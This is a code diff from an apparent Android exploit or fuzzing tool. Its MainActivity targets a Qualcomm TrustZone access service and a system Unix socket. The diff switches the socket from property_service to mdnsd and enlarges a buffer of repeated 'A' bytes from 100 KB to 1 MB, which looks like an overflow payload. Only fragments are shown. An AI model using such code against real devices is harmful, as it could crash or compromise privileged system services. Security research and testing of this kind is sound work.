@@ -44,7 +44,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
-    private static final String PROPERTY_SERVICE_PATH = "/dev/socket/property_service";
+    private static final String PROPERTY_SERVICE_PATH = "/dev/socket/mdnsd";
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
@@ -426,7 +426,7 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
             byte[] pattern = "AAAAAA".getBytes(StandardCharsets.UTF_8);
-            int totalSize = 1024 * 100;
+            int totalSize = 4096 * 256;
             byte[] payload = new byte[totalSize];
             for (int i = 0; i < totalSize; i++) {
                 payload[i] = pattern[i % pattern.length];
